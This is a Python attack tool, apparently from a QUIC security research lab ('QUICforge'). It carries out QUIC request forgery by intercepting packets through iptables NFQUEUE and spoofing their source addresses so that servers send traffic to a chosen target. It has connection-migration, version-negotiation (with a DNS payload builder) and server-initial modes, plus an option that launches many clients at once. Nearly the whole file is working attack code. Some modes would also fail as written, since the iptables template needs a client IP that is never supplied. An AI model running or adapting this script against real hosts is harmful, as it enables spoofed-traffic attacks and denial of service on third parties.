#!/usr/bin/python3

#from concurrent.futures import process
from netfilterqueue import NetfilterQueue
from scapy.all import *
import time
import subprocess
import os
import ssl
import argparse
from argparse import RawTextHelpFormatter
from multiprocessing import Process
import traceback
import pickle
import aioquic
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h0.connection import H0_ALPN, H0Connection
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import (
    DataReceived,
    H3Event,
    HeadersReceived,
    PushPromiseReceived,
)
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import QuicEvent
from aioquic.tls import CipherSuite, SessionTicket
from aioquic.quic.logger import QuicFileLogger
from aioquic.quic.packet import QuicProtocolVersion

import minimal_http_client as cl
import vnrf_payload_dns as vp_dns
import shutil


banner = '''
   ____  _    _ _____ _____ ______
  / __ \| |  | |_   _/ ____|  ____|
 | |  | | |  | | | || |    | |__ ___  _ __ __ _  ___
 | |  | | |  | | | || |    |  __/ _ \| '__/ _` |/ _ \\
 | |__| | |__| |_| || |____| | | (_) | | | (_| |  __/
  \___\_\\\\____/|_____\_____|_|  \___/|_|  \__, |\___|
                                           __/ |
                                          |___/
'''

SPOOFED_COUNT = 0
PACKET_COUNT = 0
QUIC_EXPECTED_PACKET_NUMBER = 0
# Iptables Templates
# iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"
# Modified iptables template to handle traffic from other Docker containers

# Template for intercepting traffic between two specific containers
iptables_tmpl = "iptables {action} FORWARD -p udp -s {client_ip} -d {victim_ip} --dport {victim_port} -j NFQUEUE --queue-num 1"


# Legacy Lsquic and quicly support, adjust to the correct install path
lsquic_client_tmpl = "/opt/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K"
lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN

quicly_client_tmpl = "/home/client/quic/quicly/quicly/cli {victim_ip} {victim_port} -O -p {path} -a {alpn}"

def parse_arguments():

    gen_desc = "QUIC Request Forgery Attack Script"
    parser = argparse.ArgumentParser(description=gen_desc)
    parser._optionals.title = 'Optional Arguments'
    parser._positionals.title = 'Required Arguments'

    #General Options
    optparser = argparse.ArgumentParser(add_help=False)
    optparser.add_argument('victim_ip', help='The victim\'s IP address. The victim is the server the quic connection is established with')
    optparser.add_argument('target_ip', help='The target\'s IP address. The target is the host the forged request is send to')
    optparser.add_argument('--victim_port','-v', help='The vicitm\'s listening port. Default ist 12345', default=12345, type=int)
    optparser.add_argument('--target_port','-t', help='The target\'s listening port', default=0, type=int)
    optparser.add_argument('--path','-p', help='The path to request for http requests', default="/")
    optparser.add_argument('--alpn','-a', help='The ALPN to be used. Defaults are h3-29 for draft-29 and h3 for version 1', default='h3')
    optparser.add_argument('--dos', '-d', help='Number of client processes to be started', type=int, default=1, choices=range(1,21), metavar="[1-22]")
    #optparser.add_argument('--verbose','-v', help='Turn on stdout and stderr for client subprocesses', action='store_true')

    subparsers = parser.add_subparsers(required=True, dest='mode')
    
    #Parser for CMRF
    parser_cm = subparsers.add_parser('cm', help='Connection migration mode', parents=[optparser], description=gen_desc + '\nConnection Migration Mode', formatter_class=RawTextHelpFormatter)
    parser_cm.add_argument('--start_time','-s', help='The time to wait until triggering the connection migration', type=int, default=4)
    parser_cm.add_argument('--limit','-l', help='Limits the amount of spoofed packets (Default: 0 = No limit)', type=int, default=0)
    parser_cm.add_argument('--legacy', '-e', help='Enables legacy mode with the client specified', default=False, choices=['lsquic', 'quicly'])
    parser_cm.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
    parser_cm.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
    parser_cm._optionals.title = 'Optional Arguments'
    parser_cm._positionals.title = 'Required Arguments'

    #Parser for VNRF
    parser_vn = subparsers.add_parser('vn', help='Version negotiation mode', parents=[optparser], description=gen_desc + '\n Version Negotiation Mode', formatter_class=RawTextHelpFormatter)
    parser_vn.add_argument('--cid_len','-c', help='Length of the CID used in the initial message (currently SCID/DCID are the same length)', choices=range(0,256), metavar="[0-255]", type=int, default=20)
    parser_vn.add_argument('--payload_mode','-M', help='The payload type that is sent with VNRF', default=None, choices=['dns'])
    parser_vn.add_argument('--payload','-P', help='The payload for a VNRF attack. Only works with payload_mode', default="")
    parser_vn._optionals.title = 'Optional Arguments'
    parser_vn._positionals.title = 'Required Arguments'

    #Parser for SIRF
    parser_si = subparsers.add_parser('si', help='Server initial mode', parents=[optparser], description=gen_desc + '\nServer Initial Mode', formatter_class=RawTextHelpFormatter)
    parser_si.add_argument('--legacy', '-e', help='Enables legacy mode with the client specified', default=False, choices=['lsquic', 'quicly'])
    parser_si.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
    parser_si.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
    parser_si._optionals.title = 'Optional Arguments'
    parser_si._positionals.title = 'Required Arguments'

    #Parser for ACKRF
    parser_ack = subparsers.add_parser('ack', help='ACK mode', parents=[optparser], description=gen_desc + '\nACK Mode', formatter_class=RawTextHelpFormatter)
    parser_ack.add_argument('--client_ip','-C', help='The client\'s IP address. The client is the host the forged request is send to')
    parser_ack.add_argument('--version','-V', help='The quic version to be used', choices=['1', '2'], default='2')
    parser_ack._optionals.title = 'Optional Arguments'
    parser_ack._positionals.title = 'Required Arguments'

    return parser.parse_args()


def spoof_packet(packet, ip, port=0):
    
    payload = IP(packet.get_payload())
        
    # Set spoofed source address
    old_ip = payload.src
    payload.src = ip

    old_port = payload.sport
    if port != 0:
        payload.sport = port

    # Recalculate checksums for IP and UDP
    del payload[IP].chksum
    del payload[UDP].chksum
    payload = payload.__class__(bytes(payload))
    packet.set_payload(bytes(payload))
    print("[*] {old_ip}:{old_port} -> {ip}:{port}".format(old_ip=old_ip, old_port=old_port, ip=ip, port=(port if port !=0 else old_port)))

    return packet


def connection_migration_callback(packet, starttime=0, args=None):
    global SPOOFED_COUNT
    global PACKET_COUNT
    
    PACKET_COUNT += 1

    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        packet.drop()
        print("[!] Limit reached. Dropping packet")
        return

    # Ugly workaround to give enough packets to succeed with handshake
    if PACKET_COUNT > 3:
        packet = spoof_packet(packet, args.target_ip, args.target_port)
        if args.limit != 0:
            SPOOFED_COUNT += 1

    #if time.time()-starttime > args.start_time:
    #    packet = spoof_packet(packet, args.target_ip, args.target_port)
    #    if args.limit != 0:
    #        SPOOFED_COUNT += 1

    packet.accept()
    print("[*] Packet accepted")

def version_negotiation_callback(packet, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        print("Limit: ", args.limit)
        print("SPOOFED_COUNT: ", SPOOFED_COUNT)
        packet.drop()
        print("[!] Limit reached. Dropping packet")
        return

    packet = spoof_packet(packet, args.target_ip, args.target_port)
    if args.limit != 0:
        SPOOFED_COUNT += 1
    
    packet.accept()
    print("[*] Packet accepted")
    

def server_initial_callback(packet, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        print("Limit: ", args.limit)
        print("SPOOFED_COUNT: ", SPOOFED_COUNT)
        packet.drop()
        print("[!] Limit reached. Dropping packet")
        return

    packet = spoof_packet(packet, args.target_ip, args.target_port)
    if args.limit != 0:
        SPOOFED_COUNT += 1

    packet.accept()
    print("[*] Packet accepted")


def ack_callback(packet, args=None):
    """
    First phase of the ACK mode. Captures other client, pulls the quic header and prints it.
    Attempts to decrypt the packet if possible using the shared secrets.
    
    Args:
        packet: NetfilterQueue packet
        args: Command line arguments
    """
    from aioquic.buffer import Buffer
    from aioquic.quic.packet import pull_quic_header, QuicProtocolVersion, QuicPacketType
    import re
    
    try:
        # Parse IP packet using scapy
        scapy_packet = IP(packet.get_payload())
        
        if UDP not in scapy_packet:
            print("[!] Not a UDP packet")
            packet.accept()
            return
        
        udp = scapy_packet[UDP]
        udp_payload = bytes(udp.payload)
        
        # Skip empty packets or too small packets
        if not udp_payload or len(udp_payload) < 4:
            print("[!] Empty or too small UDP payload")
            packet.accept()
            return
            
        print(f"\n[*] Analyzing packet from {scapy_packet.src}:{udp.sport} to {scapy_packet.dst}:{udp.dport}")
        print(f"[*] UDP payload length: {len(udp_payload)} bytes")
        
        # Try to parse QUIC header
        buf = Buffer(data=udp_payload)
        
        try:
            header = pull_quic_header(buf, host_cid_length=20)
        except ValueError as e:
            if "Packet fixed bit is zero" in str(e):
                print("[!] Received a packet with fixed bit set to 0, possibly not a QUIC packet")
                packet.accept()
                return
            else:
                print(f"[!] Error parsing QUIC header: {str(e)}")
                packet.accept()
                return
        
        # Print parsed header info
        print(f"[+] QUIC header: {header}")
        print(f"[+] QUIC packet type: {header.packet_type}")
        print(f"[+] Version: {header.version if header.version else 'None'}")
        print(f"[+] DCID: {header.destination_cid.hex()}")
        if header.source_cid:
            print(f"[+] SCID: {header.source_cid.hex()}")
            
        # Always forward the packet - we're just analyzing, not modifying
        packet.accept()
        
    except Exception as e:
        print(f"[!] Unexpected error in ack_callback: {str(e)}")
        print(traceback.format_exc())
        packet.accept()  # Always accept in case of error to avoid blocking traffic

def configure_client(args):
    if args.path[0] != "/":
        args.path = "/" + args.path
    url = "https://{victim_ip}:{victim_port}{path}".format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path)
    version = 'VNRF' if args.mode == "vn" else "VERSION_2"
    cid_len = args.cid_len if "cid_len" in args else 20

    #init_dcid = b"A" * cid_len
    #init_scid = b"B" * cid_len
    init_dcid = os.urandom(cid_len)
    init_scid = os.urandom(cid_len)
    if args.mode == 'vn' and args.payload_mode != None:
        if args.payload_mode == "dns":
            init_dcid,init_scid = vp_dns.create_payload(args.payload)
    configuration = QuicConfiguration(
        is_client=True, 
        supported_versions =  [QuicProtocolVersion[version].value],
        alpn_protocols=[args.alpn],
        verify_mode = ssl.CERT_NONE,
        secrets_log_file = open("secrets/secrets.log","w"),
        connection_id_length = cid_len,
        init_dcid = init_dcid,
        init_scid = init_scid,
    )
    # # Ensure qlog directory exists
    # os.makedirs("../../app/shared/qlog/rf", exist_ok=True)
    # # Set up qlog configuration
    # configuration.quic_logger = QuicFileLogger('../../app/shared/qlog/rf')
    return url, configuration


def configure_legacy_client(args):
    
    cmd = ""
    if args.legacy == 'lsquic':
        cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
        if args.version and args.version != '1':
            cmd += lsquic_client_flag_version.format(version=args.version)     
        if args.alpn and args.alpn != 'h3':
            cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
    
    if args.legacy == 'quicly':
        cmd = quicly_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path, alpn=args.alpn)
    
    print(cmd)
    return cmd


def main():

    if os.geteuid() != 0:
        exit("[!] Please run this script as root")

    args = parse_arguments()
    print(banner)

    starttime = time.time()
    if args.mode == 'ack':
        iptables_insert = iptables_tmpl.format(action="-I", client_ip=args.client_ip, victim_ip=args.victim_ip, victim_port=args.victim_port)
    else:
        iptables_insert = iptables_tmpl.format(action="-I", victim_ip=args.victim_ip, victim_port=args.victim_port)
    print("[+] Inserting iptables rules.")
    print(iptables_insert)
    subprocess.run(iptables_insert.split())
    
    try:
        #Initializing netfilter queue
        q = NetfilterQueue()
        if args.mode == 'cm':
            args.limit = args.limit * args.dos
            q.bind(1, lambda packet, starttime=starttime, args=args : connection_migration_callback(packet, starttime, args))
            print("[+] Binding connection migration callback")
        elif args.mode == 'vn':
            args.limit = args.dos
            q.bind(1, lambda packet, args=args : version_negotiation_callback(packet, args))
            print("[+] Binding version negotiation callback")
        elif args.mode == 'si':
            args.limit = args.dos
            q.bind(1, lambda packet,args=args : server_initial_callback(packet, args))
            print("[+] Binding server initial callback")
        elif args.mode == 'ack':
            print("[!] ACK mode not implemented yet, test mode only")
            q.bind(1, lambda packet,args=args : ack_callback(packet, args))
            print("[+] Binding ACK callback")

        else:
            raise NotImplementedError("Mode not implemented")

        print("[+] Starting client")
        processes = []
        if args.mode in ('cm','si') and args.legacy:
            print("[!] Legacy Mode")
            cmd = configure_legacy_client(args)
            for i in range(1,args.dos+1):
                p = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                processes.append(p)
        elif args.mode == 'ack':
            print("[!] ACK Mode")
            print("[!] Waiting for client to establish connection")
            # Start the shell command :"tcpdump -i any -n udp port 4433 -c 5"
            

        else:
            url, configuration = configure_client(args)
            for i in range(1,args.dos+1):
                p = Process(target=cl.start_client, args=(url, configuration,))
                processes.append(p)
                p.start()
        
        print("[+] Hooking into nfqueue")
        q.run()
        print("[+] Running nfqueue, waiting for packets")

    except KeyboardInterrupt:
        print("[-] Keyboard interrupt received. Terminating attack script.")
    except Exception as e:
        print("[!] Something went wrong!")
        print(e)
        print(traceback.format_exc())
    
    print("\n[+] Cleaning up")     
    print("[-] Terminating Client(s)")
    
    for p in processes:
        try:
            p.terminate()
        except:
            pass   
    print("[-] Unbinding netfilter queue.")
    q.unbind() 
    
    print("[-] Deleting iptables rule(s).")
    if args.mode == 'ack':
        iptables_delete = iptables_tmpl.format(action="-D", client_ip=args.client_ip, victim_ip=args.victim_ip, victim_port=args.victim_port)
    else:
        iptables_delete = iptables_tmpl.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port)
    print(iptables_delete)
    subprocess.run(iptables_delete.split())
    print("[+] Done")

    
if __name__ == "__main__":
    main()
